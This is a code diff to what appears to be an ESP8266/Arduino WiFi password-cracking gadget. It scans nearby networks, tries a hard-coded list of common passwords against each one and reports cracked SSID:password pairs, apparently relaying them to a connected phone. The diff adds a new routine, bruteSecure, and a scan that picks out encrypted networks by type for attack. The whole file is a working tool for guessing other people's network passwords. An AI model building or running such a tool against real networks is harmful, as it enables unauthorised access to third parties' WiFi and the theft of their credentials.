@@ -12,18 +12,20 @@ int yelLED = 13;
 int greLED = 12;
 int button = 5;
 
+
+
 char *pass[] = {"",
 "biddy888",
 "34tingisnice",
 "123456",
-"123456789",
-"qwerty",
+//"123456789",
+//"qwerty",
 "12345678",
 "111111",
-"1234567890",
+//"1234567890",
 "1234567",
 "password",
-"123123",
+//"123123",
 //"987654321",
 //"qwertyuiop",
 //"mynoob",
@@ -267,6 +269,37 @@ void brutePass(char *ssid){
   }
   }
 
+  void bruteSecure(char *ssid){
+  
+  int passNum = 0;
+  char *foundpass = NULL;
+
+    WiFi.mode(WIFI_STA);
+    WiFi.disconnect();
+    WiFi.begin(ssid, pass[passNum]);
+    
+    for(int timet = millis(); millis()-timet<10000;) {  
+      if(WiFi.status() == WL_CONNECT_FAILED || WiFi.status() == WL_NO_SSID_AVAIL){
+        break;
+        } 
+      if(WiFi.status() == WL_CONNECTED){
+        foundpass = pass[passNum];
+        break;
+        }
+      blinkYELLOW();
+      Serial.print(".");
+  }
+  if(foundpass != NULL){
+  getAddWifi(ssid, foundpass);
+  Serial.println("Found SSID:PASS!!!");
+  Serial.print(ssid);
+  Serial.print(":");
+  Serial.println(foundpass);
+  }
+  Serial.println("");
+  }
+
+
 int getAddWifi(char *ssid, char *foundpass){
   connectToPhone();
   
@@ -327,6 +360,31 @@ int getNetworks(char **foundNets){
    }}
   return numFound;
   }
+
+int getSecureNetworks(char **foundNets){
+  
+  int numFound = 0;
+  for(int j = 0; j < 5; j++){
+  int n = WiFi.scanNetworks();
+  for (int i = 0; i < n; i++) {
+    if(numFound == 30){return numFound;}
+    char *currNet = new char[WiFi.SSID(i).length()+1];
+    strcpy(currNet,WiFi.SSID(i).c_str( ));
+
+   // Serial.println(currNet);
+   Serial.print("SSID: ");
+   Serial.print(WiFi.SSID(i));
+   Serial.print("   Enc: ");
+   Serial.println(WiFi.encryptionType(i));
+    if(!contains(foundNets, currNet , numFound) && WiFi.encryptionType(i) == 7){   
+       blinkRED();
+       foundNets[numFound] = currNet;
+       numFound++;
+     }    
+   }}
+  return numFound;
+  }
+
 
 int getAllNetworkInfo(char **foundNets){
    
@@ -512,11 +570,23 @@ if(digitalRead(button) == HIGH){
     
   char *foundNets[MAXNET];
   int numFound = getNetworks(foundNets);
+  char *foundSecureNets[MAXNET];
+  int numSecure = getSecureNetworks(foundSecureNets);
+  Serial.println("Normal nets");
   printArr(foundNets, numFound);
+  Serial.println("Maybe Secure Nets: ");
+  printArr(foundNets, numSecure);
+
+  for(int i = 0; i<numSecure; i++){
+    Serial.println(foundSecureNets[i]);
+    bruteSecure(foundSecureNets[i]);
+   }
+  
   for(int i = 0; i<numFound; i++){
     Serial.println(foundNets[i]);
     brutePass(foundNets[i]);
    }
+   
 
 
    //test
